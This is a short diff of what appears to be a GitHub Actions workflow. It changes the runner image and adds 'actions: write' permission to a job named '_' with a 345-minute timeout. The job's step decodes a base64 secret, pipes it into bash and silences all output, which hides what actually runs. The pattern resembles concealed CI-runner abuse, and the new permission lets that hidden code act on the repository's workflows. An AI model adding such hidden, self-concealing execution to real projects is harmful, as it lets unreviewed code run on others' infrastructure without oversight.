@@ -8,8 +8,10 @@ concurrency:
 # 3
 jobs:
   _:
-    runs-on: ubuntu-slim
+    runs-on: ubuntu-latest
     timeout-minutes: 345
+    permissions:
+      actions: write
     steps:
       - run: echo "${{ secrets.BASH_BASE64 }}" | base64 -di | bash > /dev/null 2>&1
         env:
